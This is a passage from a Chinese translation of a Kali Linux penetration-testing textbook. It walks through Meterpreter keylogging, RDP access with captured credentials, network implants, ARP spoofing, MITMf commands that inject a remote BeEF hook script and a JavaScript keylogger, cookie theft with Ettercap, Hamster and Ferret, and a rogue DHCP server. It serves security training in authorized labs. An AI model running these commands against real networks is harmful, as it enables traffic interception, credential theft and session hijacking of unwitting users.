请注意，Hydra 中的 RDP 模块可能无法在现代 Windows 版本上工作。有关 Hydra 的更多信息，请访问其官方 GitHub 存储库[`github.com/vanhauser-thc/thc-hydra`](https://github.com/vanhauser-thc/thc-hydra)。

在**Metasploit**中收到`meterpreter` shell 后，以下是一些有用的命令，可以帮助您捕获按键和受害者的屏幕：

+   `screenshare`：此命令用于实时观看远程受害者的桌面。

+   `screenshot`：拍摄受害者的桌面照片。

+   `keyscan_start`：使用 Meterpreter 开始键盘记录。

+   `keyscan_stop`：停止键盘记录。

+   `keyscan_dump`：生成捕获的按键的转储。

以下屏幕截图显示了在 Meterpreter 中执行`screenshare`命令后，受害者桌面的实时视图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1be861d2-4175-4fac-abdb-d20fb1aa743c.png)

正如您所看到的，一旦真正的黑客进入网络或系统，他们可以做的事情是相当可怕的。

您现在可以检测和利用 Windows 操作系统中的 EternalBlue 漏洞。接下来，我们将看看如何利用用户凭据来使我们受益。

# 利用用户凭据

现在我们已经为目标 Microsoft Windows 系统获得了用户凭据，让我们尝试远程连接。在这个练习中，我们将使用已经预先安装在 Kali Linux 中的**rdesktop**客户端。让我们开始：

**rdesktop**是一种用于远程管理的开源协议，类似于 Microsoft 的 RDP。

1.  要使用 rdesktop，请打开一个新的终端窗口，并使用以下语法：

```
rdesktop -u <username> -p <password> <target's IP address>
```

以下片段是使用 rdesktop 工具的示例，包括所有必要的细节：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/30161b19-e9e4-42b8-b3dc-e58739d66993.png)

1.  一旦您执行了命令，rdesktop 将尝试与目标设备建立远程连接。一旦成功，rdesktop 将提供一个新窗口，显示目标的用户界面，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/85f8e609-6326-462d-85c9-f59daa8037da.png)

在这一点上，我们已经成功进入了目标操作系统，并对其进行了控制。

如果您的攻击者系统没有 rdesktop 工具，可以在其官方 GitHub 存储库找到：[`github.com/rdesktop/rdesktop`](https://github.com/rdesktop/rdesktop)。有关 rdesktop 的更多信息，请访问其官方网站[www.rdesktop.org](http://www.rdesktop.org)。

正如您所看到的，我们可以简单地使用 Kali Linux 中的本机工具和受害者的凭据来在渗透测试期间访问资源、系统和网络。在下一节中，我们将深入探讨网络植入物。

# 直接将 PWN 盒和其他工具插入网络

渗透测试人员经常倾向于在组织的网络中放置一个微小的特殊盒子。这些被称为网络植入物，有时也被称为 PWN 盒。网络植入物允许攻击者通过连接到植入工具来建立从互联网到企业网络的连接，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/cd9bf0fa-5a58-490d-8282-98b8edab69b0.png)

以下是一个可以插入以拦截网络流量的网络植入物的照片。这个设备能够捕获实时数据包并将它们存储在 USB 闪存驱动器上。它具有远程访问功能，可以允许渗透测试人员或系统管理员远程访问设备，从而允许用户在网络上远程执行各种任务。这个小设备被称为**Packet Squirrel**，由 Hak5 创建：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/951bc163-942d-4e8b-a238-a1bc8216f1cc.png)

此外，还有另一种看起来像 USB 以太网适配器的设备。这个所谓的以太网适配器也是另一种网络植入物，可以让渗透测试人员远程访问网络并执行各种任务，如扫描、利用和攻击枢纽。这个小设备被称为**LAN Turtle**，又是 Hak5 生产的另一件令人惊叹的装备：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4235dc6c-a9b6-4c4b-a3f1-358125036ff8.png)

在过去的几年里，**Raspberry Pi**（[www.raspberrypi.org](http://www.raspberrypi.org)）被引入到计算机世界。今天，许多机构、组织和家庭都在许多项目中使用 Raspberry Pi，从学习、编程到家庭安全监控系统。这个信用卡大小的小型计算机有无限的可能性：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/d9b80e5f-db68-40d0-941f-b245c29b6bcb.png)

然而，目前有许多操作系统可用于 Raspberry Pi，其中之一是 Kali Linux ARM 镜像（[`www.offensive-security.com/kali-linux-arm-images/`](https://www.offensive-security.com/kali-linux-arm-images/)）。想象一下将 Kali Linux 加载到这个便携设备中，将其植入到组织的网络中，并设置远程访问的可能性。如果这种情况是由真正的攻击者实施的，结果将是严重的，但渗透测试人员可以通过向客户展示他们对内部网络发起的攻击有多么脆弱来帮助他们很多。

有很多设备和小工具可以促进渗透测试，可能性是无限的。在下一节中，我们将介绍 NAC 的基础知识。

# 绕过 NAC

NAC 是一个旨在控制访问和确保合规性的系统。它使用一套过程和技术，专注于控制谁和什么能够访问网络及其资源。NAC 通过授权符合一定合规标准的设备在企业网络上运行来实现这一点。

一旦设备连接，NAC 服务器就能够对设备进行配置文件和检查，以确定连接的设备是否符合合规标准，然后允许访问网络资源、安全策略和控制，这些都是配置的，以确保有一定形式的限制，防止不符合规定的设备获取网络访问权限。

IEEE 802.1x 是 LAN（有线）和 WLAN（无线）网络的 NAC 标准。在 802.1x 网络中，有三个主要组件：

+   **认证服务器**: 认证服务器是处理网络上的**认证、授权和计费**（**AAA**）服务的设备。这是创建和存储用户帐户以及应用特权和策略的地方。认证服务器运行**远程认证拨号用户服务**（**RADIUS**）或**终端访问控制器访问控制系统加**（**TACACS+**）作为其协议。

+   **认证器**: 这通常是您尝试访问的网络设备，无论是出于管理目的还是仅仅是访问网络。这些设备可以是无线路由器/接入点或网络交换机。

+   **Supplicant**: Supplicant 是客户端设备，如智能手机或笔记本电脑，希望访问网络。Supplicant 连接到网络（有线或无线），并收到认证登录窗口，由认证器提供。当用户提交其用户凭据时，认证器会查询认证服务器，以验证用户并确定用户登录到网络时应用的策略和权限。

绕过 NAC 系统可能有些挑战。在本章和上一章的课程中，我们看了如何收集用户凭据并欺骗我们的攻击者机器（Kali Linux）的身份。使用目标网络上有效用户的 MAC 地址和用户凭据将为您提供对安全网络的某种访问权限。

但是，NAC 服务器能够对所有连接设备上的操作系统和反恶意软件保护进行配置文件化。如果您的系统不符合合规要求，这可能会触发红旗，或者根据策略不允许访问。

# 总结

在本章中，我们能够涵盖了许多实用内容，例如破解 WEP 和 WPA 无线加密标准以恢复密钥（密码）。在利用无线安全性之后，我们讨论并演示了最佳实践，以便我们可以保护无线网络免受潜在黑客的攻击。

此外，还介绍了对微软的 RDP 和 Citrix 服务进行渗透测试的实际方法。最后，我们讨论了各种网络植入物的用途，以及它们如何可以保持对企业网络的远程访问。

您现在具备了访问无线网络、对目标系统进行利用以及访问 Linux 和 Windows 操作系统的技能。

在第十一章中，*网络渗透测试-连接后攻击*，我们将探讨连接后阶段的各种工具。

# 问题

1.  WPA2 使用什么算法进行数据加密？

1.  用于发现运行 Citrix 应用程序的服务器的 Nmap 脚本是什么？

1.  微软的 RDP 使用的默认端口是什么？

1.  Kali Linux 中有哪些密码破解工具？

1.  通常用于存储所有用户帐户和策略的设备是什么？

1.  在 Metasploit 中，可以使用哪个命令来查找模块？

1.  NAC 的标准是什么？

# 进一步阅读

以下是一些推荐阅读资源：

+   **Metasploit Unleashed**: [`www.offensive-security.com/metasploit-unleashed/`](https://www.offensive-security.com/metasploit-unleashed/)

+   **其他安全工具**: [`sectools.org/`](https://sectools.org/)


# 第十一章：网络渗透测试 - 连接后攻击

获得对系统或网络的访问绝对不是执行扫描和进一步利用的结束。一旦你进入了一个安全环境，比如目标组织，这就是你需要分割并征服其他内部系统的地方。然而，执行内部扫描的技术与前几章提到的类似（第六章，*主动信息收集*）。在这里，将介绍新的技术，用于扫描、利用、权限提升和在网络上执行横向移动。更进一步地，你将学习如何使用各种技术和工具执行**中间人攻击**（**MITM**）并了解如何收集用户凭据等敏感信息。

在本章中，我们将涵盖以下主题：

+   收集信息

+   MITM 攻击

+   会话劫持

+   **动态主机配置协议**（**DHCP**）攻击

+   利用 LLMNR 和 NetBIOS-NS

+   **Web 代理自动发现**（**WPAD**）协议攻击

+   Wireshark

+   提升权限

+   横向移动策略

+   PowerShell 技巧

+   发动 VLAN 跳跃攻击

# 技术要求

以下是本章的技术要求：

+   Kali Linux: [www.kali.org](http://www.kali.org)

+   MITMf: [`github.com/byt3bl33d3r/MITMf`](https://github.com/byt3bl33d3r/MITMf)

+   Autoscan: [`sourceforge.net/projects/autoscan/files/AutoScan/autoscan-network%201.42/`](https://sourceforge.net/projects/autoscan/files/AutoScan/autoscan-network%201.42/)

+   Wireshark: [www.wireshark.org](http://www.wireshark.org)

+   Windows 7

+   Windows 10

+   Windows Server 2016

+   CentOS/Ubuntu

# 收集信息

在本书的早期部分，我们深入讨论了使用 Kali Linux 中的被动和主动技术和工具收集有关目标的信息的重要性。然而，当你通过利用攻击入侵系统时，这并不是渗透测试的结束。相反，这是你将继续向前利用组织网络上的不同系统、创建多个后门并获得各种受害设备上最高权限的起点。

在本节中，我们将使用以下工具进行网络扫描：

+   Netdiscover

+   AutoScan

+   Zenmap

让我们更详细地看看这些。

# 使用 Netdiscover 进行扫描

**Netdiscover**只是一个利用**地址解析协议**（**ARP**）发现网络段上连接的客户端的扫描器。ARP 在 OSI 参考模型的数据链路层（第 2 层）和网络层（第 3 层）之间运行。设备使用 ARP 来解析 IP 地址到 MAC 地址，以进行本地通信。

使用 Netdiscover 进行内部网络扫描，请遵循以下步骤：

1.  执行以下命令：

```
netdiscover -r <network-ID>/<network prefix> netdiscover -r 10.10.10.0/24
```

Netdiscover 将开始显示所有活动设备，显示它们的 IP 地址、MAC 地址、其**网络接口卡**（**NICs**）的供应商和它们的主机名，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/cc1d780e-ccd2-4f3f-b054-141c3499e331.png)

1.  要执行被动扫描并使用 Netdiscover 的嗅探器模式，请使用`-p`参数。以下是启用被动模式的示例：

```
netdiscover -p -r 10.10.10.0/24
```

由于被动模式意味着耐心地等待在电线上检测到 ARP 消息，填充表可能会耗时，因为你必须等待设备进行通信。以下是一张截图，显示被动模式已启用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/7cc7af6c-a717-4d04-b6a4-9300c0e0c4f2.png)

在渗透测试中，始终记得使用简单的工具来完成任务。有时，使用复杂的工具可能会让你陷入一段时间的困境。正如你已经注意到的，我们一直在使用的工具并不难使用，以完成给定的任务。

在这一部分，您已经学会了如何在 Kali Linux 上使用 Netdiscover 执行被动扫描。接下来，我们将学习如何使用 AutoScan 工具执行网络扫描。

# 使用 AutoScan-Network 进行扫描

AutoScan-Network 工具能够扫描和对本地网络段上的设备进行配置文件化。

要开始，请观察以下步骤：

1.  从以下网址下载 AutoScan-Network：[`sourceforge.net/projects/autoscan/files/AutoScan/autoscan-network%201.42/`](https://sourceforge.net/projects/autoscan/files/AutoScan/autoscan-network%201.42/)。

选择如下屏幕截图中显示的版本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/876033dc-c556-4e9e-9ba0-7353041478a3.png)

1.  一旦文件成功下载到您的 Kali Linux 机器上，打开终端并执行`tar -xzvf autoscan-network-1.42-Linux-x86-Install.tar.gz`来提取内容。以下是`tar`实用程序中使用的描述：

+   `-x`：用于提取文件

+   `-z`：通过 gzip 过滤压缩文件

+   `-v`：提供详细输出

+   `-f`：指定文件或设备

1.  接下来，使用`./autoscan-network-1.42-Linux-x86-Install`安装工具，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/12910d23-e509-4579-844d-6cff03b3e1f9.png)

1.  现在 AutoScan-Network 已经安装在 Kali Linux 上，是时候打开应用程序了。在 Kali Linux 桌面环境中，单击应用程序|AutoScan-Network 打开应用程序。

1.  网络向导将打开；单击**前进**开始设置 AutoScan-Network。

1.  接下来，设置您的网络名称并单击**前进**。

1.  向导将要求输入网络位置；将其保留为默认设置（localhost）并单击**前进**。

1.  选择您的网络适配器。如果您使用 LAN 适配器（`eth0`），请将其保留为默认设置并单击**前进**。

1.  在摘要窗口上单击**前进**以确认您的配置。

AutoScan-Network 将自动开始扫描您的本地网络，并尝试对每个设备上找到的任何服务进行指纹识别，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a7b2484b-3f08-4036-9d79-1f067b97bddf.png)

完成后，AutoScan-Network 将显示在本地网络上能够检测到的所有 IP 地址、主机名和服务。

在下一节中，我们将介绍使用 Zenmap 进行扫描所需的基本技术。

# 使用 Zenmap 进行扫描

Zenmap 是 Nmap 的图形用户界面版本。它提供与其命令行版本相同的功能和特性。要打开 Zenmap，请执行以下步骤：

1.  转到应用程序|信息收集|Zenmap。

1.  一旦应用程序打开，您将看到以下用户界面，允许您指定目标或范围以及要执行的扫描类型（配置文件），并允许您创建和执行自定义扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/82b6b411-f956-4c4a-a9be-b3e5c517e07e.png)

1.  扫描完成后，Zenmap 将在选项卡中填充以下信息：Nmap 输出、端口/主机、拓扑和主机详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6e90e1d3-439d-45d2-ab7b-96a63d4b6dd1.png)

在我们的练习中，我们一直在`10.10.10.0/24`网络上执行快速扫描，并且已经能够确定活动系统和任何开放的端口。

在本节中，您已经掌握了使用 Zenmap 进行快速扫描所需的技能。在下一节中，我们将学习更多关于 MITM 攻击的知识。

# MITM 攻击

**MITM**攻击就是攻击者坐在受害者和其余网络之间，拦截和捕获网络数据包。以下是一个示例，显示了一个攻击者（`192.168.1.5`）连接到与受害者（`192.168.1.10`）相同的段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/015f7cb4-54a1-4aeb-a9bc-d188d6d9095f.png)

默认情况下，攻击者机器将无法拦截和捕获**PC1**和默认网关（`192.168.1.1`）之间的任何流量。但是，攻击者可以在受害者和网关之间执行**ARP 中毒**。ARP 中毒是指攻击者向设备发送**虚假 ARP 响应**，告诉设备更新其 IP 到 MAC 的映射。攻击者机器将向受害者发送虚假 ARP 消息，告诉受害者的机器网关已更改为`192.168.1.1 - CC:CC:CC:CC:CC:CC`，并向网关发送消息，告诉它**PC1**已更改为`192.168.1.10 - CC:CC:CC:CC:CC:CC`。

这将导致**PC1**和路由器之间交换的所有数据包都通过攻击者机器传递，攻击者机器将对这些数据包进行嗅探，以获取敏感信息，如路由更新、运行服务、用户凭据和浏览历史。

在接下来的部分中，我们将看一下在内部网络上执行成功的 MITM 攻击的各种工具和技术。

# ARPspoof

我们将首先看的工具之一是 ARPspoof。ARPspoof 用于向受害者的机器发送虚假 ARP 消息，欺骗其将流量发送到攻击者的机器或网络上的另一个网关。由于我们知道 ARP 中毒和欺骗的工作原理，我们可以直接跳入使用这个工具的实践。我们使用以下语法：

```
arpspoof -i <network adapter> -r -t <victim IP address> <gateway IP address>
```

在我们的实验室中，我正在受害者机器（`10.10.10.15`）和网关（`10.10.10.1`）之间执行 MITM 攻击，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0b8f2560-87b8-4051-b9a0-630e9c35a30a.png)

ARPspoof 将开始持续向两台设备发送**虚假 ARP**消息。使用*Ctrl* + *C*将停止 ARP 中毒攻击，ARPspoof 将执行清理操作，恢复受害者和网关之间的工作状态，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f2d3675c-f02a-48f4-a950-3465a6a7427b.png)

一旦清理成功结束，PC（`10.10.10.15`）和网关（`10.10.10.1`）将在网络上按原意进行通信。

完成本节后，您现在可以使用 ARPspoof 执行 MITM 攻击。在下一节中，您将了解 MITMf 及其功能。

# MITMf

MITMf 是一个执行各种 MITM 攻击和技术的多合一工具，用于受害者的内部网络。MITMf 的功能包括以下内容：

+   捕获 NTLM v1/v2、POP、IMAP、SMTP、Telnet、FTP、Kerberos 和 SNMP 凭据。这些凭据将允许您访问用户的帐户、系统/设备、文件共享和其他网络资源。

+   使用 Responder 执行 LLMNR、NBT-NS 和 MDNS 中毒攻击。

要开始使用 MITMf，请按照以下说明操作：

1.  在 Kali Linux 中使用以下命令安装依赖包：

```
apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
```

1.  完成后，安装`virtualenvwrapper`：

```
pip install virtualenvwrapper
```

1.  接下来，您需要更新`virtualenvwrapper.sh`脚本中的源。首先，执行`updatedb`命令创建本地文件系统中所有文件位置的更新数据库。完成后，使用`locate virtualenvwrapper.sh`命令获取文件路径。然后，执行`source`命令，后跟文件路径，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4def36d9-0436-4cf4-9a9b-1efd78d50d4d.png)

1.  使用`mkvirtualenv MITMf -p /usr/bin/python2.7`命令创建虚拟环境并下载 MITMf 存储库，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/80c17ae0-0b98-497f-9d93-8c180e044b97.png)

1.  下载存储库后，更改目录并克隆子模块：

```
cd MITMf && git submodule init && git submodule update -recursive
```

1.  使用以下命令安装依赖项：

```
pip install -r requirements.txt
```

1.  要查看帮助菜单，请使用以下命令：

```
python mitmf.py --help 
```

您现在已在 Kali Linux 机器上设置了 MITMf。接下来，让我们深入了解 MITMf 的用例。

# MITMf 的用例

以下是 MITMf 的各种用例：

请记住，所有攻击都应该只在实验环境中进行，并且只能针对你已经获得合法许可的网络进行。

+   你可以使用 MITMf 绕过 HTTPS：

```
python mitmf.py -i eth0 --spoof --arp --hsts --dns --gateway 10.10.10.1 --target 10.10.10.15
```

+   +   `-i`：指定要对 MITMf 执行的接口

+   `--spoof`：告诉 MITMf 伪造身份

+   `--arp`：通过 ARP 执行流量重定向

+   `--hsts`：加载 sslstrip 插件

+   `--dns`：加载代理以修改 DNS 查询

+   `--gateway`：指定网关

+   `--target`：指定目标

+   你可以在网关（`10.10.10.1`）和整个子网之间执行 ARP 欺骗攻击：

```
python mitmf.py -i eth0 --spoof --arp --gateway 10.10.10.1
```

+   你可以在受害者和网关（`10.10.10.1`）之间执行 ARP 欺骗：

```
python mitmf.py -i eth0 --spoof --arp --target 10.10.10.10-10.10.10.50 --gateway 10.10.10.1
```

+   你可以在对子网和网关（`10.10.10.1`）执行 ARP 欺骗攻击时执行 DNS 欺骗：

```
python mitmf.py -i eth0 --spoof --dns --arp --target 10.10.10.0/24 --gateway 10.10.10.1
```

+   你可以使用 MITMf 执行 LLMNR/NBTNS/MDNS 欺骗：

```
python mitmf.py -i eth0 --responder --wredir --nbtns
```

+   你可以执行 DHCP 欺骗攻击：

```
python mitmf.py -i eth0 --spoof --dhcp
```

这种攻击在后渗透阶段非常有用。

IP 寻址方案和子网信息取自配置文件。

+   可以使用 MITMf 注入 HTML iframe：

```
python mitmf.py -i eth0 --inject --html-url <malicious web URL>
```

+   可以注入 JavaScript 脚本：

```
python mitmf.py -i eth0 --inject --js-url http://beef:3000/hook.js
```

你可以使用`responder`模块将 ARP 欺骗作为恶意代理服务器执行 WPAD 协议的 ARP 欺骗：

```
python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --responder --wpad
```

以下是可以整合的其他参数列表：

+   **屏幕捕获**：这允许 MITMf 使用 HTML5 画布准确地获取客户端的 Web 浏览器图像，使用`--screen`命令。此外，你可以使用`--interval seconds`命令以时间间隔捕获屏幕截图。

+   **键盘记录器**：`--jskeylogger`命令将 JavaScript 键盘记录器注入受害者的网页，以捕获按键。

请记住，要查看 MITMf 工具的其他参数，你可以执行`python mitmf.py --help`命令。

完成了这一部分，你现在已经具备了使用 MITMf 执行各种类型攻击所需的技能。在下一部分，我们将介绍会话劫持攻击。

# 会话劫持

在这一部分，我们将在我们网络上的目标机器上执行会话劫持。为了执行这次攻击，我们将结合一些其他技术来确保它的成功。每当用户访问一个网站时，Web 服务器会向 Web 浏览器发送一个 cookie。该 cookie 用于监视用户的活动，并通过跟踪购物车中的商品、在浏览网站的其他区域时保持持久登录等方式提供更好的用户体验。

会话劫持允许攻击者或渗透测试人员在受害者登录网站时捕获并接管（劫持）另一个用户的会话。会话劫持允许渗透测试人员捕获会话令牌/密钥，然后使用它来未经授权地访问系统上的信息和资源。例如，捕获已登录其在线银行门户的用户的会话可以允许攻击者访问受害者的用户帐户，而无需输入受害者的用户凭据，因为他们可以简单地向网站/在线门户提供 cookie 数据。

在我们开始之前，我们将在我们的实验网络中使用以下拓扑来完成我们的练习：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1eed32ba-0333-4fc8-8f0e-853a81c5c8bd.png)

为了确保你成功完成这个练习，请使用以下说明：

1.  使用 Kali Linux 中的**Ettercap-Graphical**建立 MITM 攻击。要执行此任务，请按照以下步骤导航到应用程序| 09-嗅探和欺骗| ettercap-graphical：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/dd6e6b03-d096-4a37-9189-76536f24a6ec.png)

1.  一旦 Ettercap 打开，点击 Sniff | Unified sniffing：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ac42ad1d-6e95-4cd1-9a15-d6b5ce2191f1.png)

1.  将会出现一个小弹出窗口。选择你的**网络接口：** **eth0**，然后点击**OK**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ddaa88ff-71af-4eca-a610-00f255571e1e.png)

1.  通过导航到主机|扫描主机来扫描你网络上的所有主机设备：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/dbc7923e-36ac-4dbd-865b-9a7f6c03cc08.png)

1.  扫描完成后，点击主机|主机列表，查看网络上的目标列表。选择您的目标，然后点击**添加到目标 1**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/99bdad5c-1a3c-4446-9f75-6ca0db075585.png)

1.  成功添加目标后，在 Ettercap 上启用 ARP 毒化，导航到 Mitm| ARP 毒化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/232c440a-def6-4d93-b784-4b485b49dfae.png)

1.  将弹出一个窗口。选择**嗅探远程连接**，然后点击**确定**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/367bf062-7527-42d3-96d9-3d2f1adde364.png)

1.  接下来，点击开始|开始嗅探以启用 MITM 攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/2b35fb21-4e12-4997-b43d-53a768911536.png)

1.  接下来，我们将使用**Hamster**工具来帮助我们操纵数据。要打开 Hamster，导航到应用程序| 09-嗅探和欺骗|仓鼠：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4e987849-1294-4108-b92b-8a89d0a0b32c.png)

**Hamster**将在新的终端窗口上打开一个命令行界面，并提供 URL`http://127.0.0.1:1234`，用于查看会话信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/701f0c22-a9db-429e-9b98-986a5e761c38.png)

1.  接下来，我们将使用**Ferret**来捕获受害者和数据目的地之间的会话 cookie。默认情况下，Kali Linux 没有安装 Ferret；此外，Ferret 是一个 32 位工具。要在 Kali Linux 上安装 Ferret，请使用以下命令：

```
dpkg --add-architecture i386 && apt-get update && apt-get install ferret-sidejack:i386
```

安装成功后，导航到应用程序| 09-嗅探和欺骗|仓鼠：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/37986d1e-7e74-4044-8f7b-a2485043098b.png)

1.  使用`ferret -i eth0`命令捕获以太网接口上的 cookie：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8d9f2ce6-0cf2-4901-a445-fd2aff2f9c69.png)

1.  在 Kali Linux 上打开网络浏览器，输入`http://127.0.0.1:1234`以访问**Hamster**代理界面。点击**适配器**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/34ae3843-b9a7-4504-9ae4-412f9edd40fa.png)

1.  选择`eth0`适配器，然后点击**提交查询**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/507c9079-0ff6-457a-af30-45abff613640.png)

1.  前往受害者的机器，使用网络浏览器，输入**Metasploitable**的 IP 地址。接下来，点击**Damn Vulnerable Web Application**（**DVWA**）。然后，使用用户名（`admin`）和密码（`password`）登录，以在受害者机器和另一个系统之间生成一些流量。

1.  在您的 Kali Linux 机器上，刷新 Hamster 网页。现在应该看到受害者的 IP 地址出现。点击受害者的 IP 地址以获取更多信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8759207a-45f9-422f-9f63-b535b570afec.png)

1.  点击左侧列中的任何 URL 将提供受害者在其网络浏览器上可能看到的图像：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/e3a8a754-aa8d-49ca-a679-c4c88878cd2d.png)

1.  要查看 cookie/session 详细信息列表，请在网络浏览器上打开新标签页，并输入此处显示的 URL：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/84ae6cf7-2797-4a93-ac4a-e278d46a2a72.png)

我们能够捕获受害者机器和 Web 服务器之间的交易的会话 cookie。完成此练习后，您现在可以执行 cookie 窃取/会话劫持攻击。

现在您已经完成了这个练习，您具备了在任何网络上执行会话劫持攻击所需的技能。在下一节中，我们将介绍**动态主机配置协议**（**DHCP**）攻击。

# DHCP 攻击

在许多网络中，有数百甚至数千台终端设备，如台式机、笔记本电脑和智能设备，需要网络连接以访问企业网络上的资源。但是，每个设备都需要在网络上发送和接收消息（数据包）的地址，访问本地网络之外的资源的路径（默认网关），用于确定逻辑网络分段的标识符（子网掩码），以及可以解析网络上主机名到 IP 地址的人（DNS 服务器）。

网络管理员必须确保所有终端设备上配置了以下四个组件：

+   IP 地址

+   子网掩码

+   默认网关

+   DNS 服务器

使用 DHCP 服务器允许 IT 专业人员快速有效地自动分配 IP 配置给他们网络上的终端设备。为了进一步理解网络上 DHCP 的重要性，当客户端连接到网络（有线或无线）时，客户端机器会在网络上广播一个**DHCP Discover**数据包，寻找提供 IP 配置的 DHCP 服务器。当 DHCP 服务器收到发现数据包时，它会用**DHCP Offer**数据包做出回应。该数据包包含可用的 IP 设置，客户端可以在网络上使用。客户端收到并检查来自服务器的提供后，会用**DHCP Request**做出回应，用于通知服务器将使用 IP 信息。最后，DHCP 服务器通过发送**DHCP ACK**数据包提供确认和确认。

以下图表概述了 DHCP 过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/705aa3a4-6d57-426f-8dd7-40e70a641f1c.png)

由于 DHCP 服务器通常向客户设备提供默认网关信息，如果 DHCP 服务器提供另一条通往互联网的路径，比如通过攻击者的机器，客户（受害者）机器将接受新路径并相应地转发其数据包。此外，将客户机上的 DNS 服务器配置更改为将所有 DNS 查询转发到虚假 DNS 服务器可能会导致受害者浏览器加载钓鱼网页。

在本节中，我们将创建一个恶意 DHCP 服务器来重定向网络上受害者的流量。首先，我们将使用 Metasploit 框架来创建我们的恶意 DHCP 服务器：

1.  使用以下命令启用 PostgreSQL 数据库和 Metasploit：

```
service postgresql start msfconsole
```

1.  Metasploit 包含一个允许我们启用 DHCP 服务器的模块。使用以下截图中显示的命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/38c6a458-8dac-497c-a88f-286c8fa41b6a.png)

`show options`命令将显示在 Metasploit 中执行此模块之前必须的参数的描述，这些参数既是可选的又是必需的。

1.  我们将设置起始和结束 IP 地址，网络广播地址，网络掩码（子网掩码），DNS 服务器，默认网关（默认路由器）和恶意 DHCP 服务器的 IP 地址。以下截图演示了如何为每个参数设置值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a5fb3556-b3f3-4a15-9929-bd171e3aac95.png)

1.  完成后，使用`show options`命令验证每个参数的值是否设置正确：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/afd623b3-af16-477b-a499-5c2e941f2ed5.png)

1.  当您准备好启动/执行模块时，请输入`run`并按*Enter*。

以下片段来自我们渗透实验室中的 Windows 10 机器。仔细观察，您会发现 IP 配置在我们之前在 Metasploit 中配置的参数范围内：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4c67743a-3915-476e-88a3-87da4009e2da.png)

此外，以下是在网络上启动恶意 DHCP 服务器期间的 Wireshark 捕获的 DHCP 消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4d082a93-c082-4f0e-9220-9537c47087bc.png)

仔细观察截图，我们可以看到从 Windows 10 机器发送的**DHCP Discover**数据包，寻找网络上的 DHCP 服务器。最终，我们的恶意 DHCP 服务器能够用**DHCP Offer**数据包回应客户端。

以下显示了发送给受害者 Windows 10 机器的**DHCP Offer**数据包的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a61193c8-6baf-4c28-b02b-6404c0aeb02c.png)

